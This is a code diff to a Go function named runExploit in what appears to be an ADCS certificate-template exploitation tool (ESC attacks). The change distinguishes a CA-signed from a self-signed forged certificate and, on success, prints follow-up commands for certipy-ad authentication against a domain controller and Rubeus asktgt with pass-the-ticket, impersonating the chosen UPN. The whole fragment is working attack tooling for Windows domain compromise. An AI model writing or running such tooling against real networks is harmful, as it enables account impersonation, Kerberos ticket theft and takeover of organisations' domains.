@@ -612,14 +612,26 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		return nil
 	}
 
-	fmt.Printf("\n[+] Exploitation successful!\n")
+	// Detect whether we got a CA-signed cert or fell back to self-signed
+	selfSigned := cert.Issuer.CommonName == cert.Subject.CommonName
+
+	if selfSigned {
+		fmt.Printf("\n[!] OFFLINE MODE — certificate is self-signed (CA enrollment failed)\n")
+		fmt.Printf("    This cert will NOT authenticate against a real domain controller.\n")
+		fmt.Printf("    To get a CA-signed cert, ensure the CA's web enrollment (/certsrv/) is reachable.\n")
+	} else {
+		fmt.Printf("\n[+] Exploitation successful — CA-signed certificate obtained!\n")
+	}
 	fmt.Printf("    Exploit:  ESC%s\n", escID)
 	fmt.Printf("    Template: %s\n", templateName)
 	fmt.Printf("    UPN:      %s\n", upn)
+	fmt.Printf("    Issuer:   %s\n", cert.Issuer.CommonName)
 	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
-	fmt.Printf("\n[*] Authenticate with the certificate:\n")
-	fmt.Printf("    certipy-ad auth -pfx %s -dc-ip %s -domain %s\n", pfxPath, cfg.TargetDC, cfg.Domain)
-	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", upn, pfxPath)
+	if !selfSigned {
+		fmt.Printf("\n[*] Authenticate with the certificate:\n")
+		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip %s -domain %s\n", pfxPath, cfg.TargetDC, cfg.Domain)
+		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", upn, pfxPath)
+	}
 	return nil
 }
 
